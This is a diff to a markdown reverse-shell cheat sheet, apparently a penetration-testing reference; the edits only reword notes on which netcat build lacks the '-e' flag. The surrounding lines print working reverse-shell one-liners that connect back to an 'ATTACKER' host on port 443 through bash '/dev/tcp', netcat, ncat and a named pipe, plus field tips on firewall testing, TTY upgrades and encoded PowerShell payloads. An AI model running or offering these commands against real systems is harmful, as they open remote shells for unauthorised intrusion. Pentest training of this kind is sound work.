@@ -223,7 +223,7 @@ bash -c "bash -i >& /dev/tcp/ATTACKER/443 0>&1"
 ### 4.2 Netcat
 
 ```bash
-# Only netcat-traditional / ncat support -e; OpenBSD netcat (Kali default) does NOT.
+# Only netcat-traditional / ncat support -e; OpenBSD netcat (the default on many distributions) does NOT.
 nc ATTACKER 443 -e /bin/bash
 
 # Portable named-pipe shell (works with any netcat):
@@ -234,7 +234,7 @@ rm -f /tmp/p; mknod /tmp/p p
 ncat -e /bin/bash ATTACKER 443
 ```
 
-> **Edge case:** if `nc -h` does not list `-e`, use the `mkfifo` variant. This is the most common reason a “netcat reverse shell” fails on Kali against a target that also runs OpenBSD `nc`.
+> **Edge case:** if `nc -h` does not list `-e`, use the `mkfifo` variant. This is the most common reason a “netcat reverse shell” fails on the attacker host against a target that also runs OpenBSD `nc`.
 
 ### 4.3 Python
 
@@ -385,7 +385,7 @@ reset
 ## 11. Field Notes
 
 - **A silent connect-back is a firewall, not a payload bug.** Test `curl`/`nc -z` to the attacker port from the target before spending time on syntax.
-- **`nc -e` is not universal.** OpenBSD `nc` (Kali default) has no `-e`; use `mkfifo` or `ncat`.
+- **`nc -e` is not universal.** OpenBSD `nc` (the default on many distributions) has no `-e`; use `mkfifo` or `ncat`.
 - **`/dev/tcp` is bash-only.** In a minimal container, it will fail silently or with “No such file or directory”.
 - **The PTY upgrade is not optional.** `sudo`, `su`, `vim`, `less`, and password prompts all require a TTY.
 - **PowerShell quoting is the #1 Windows payload failure.** Use `-EncodedCommand` to eliminate it.
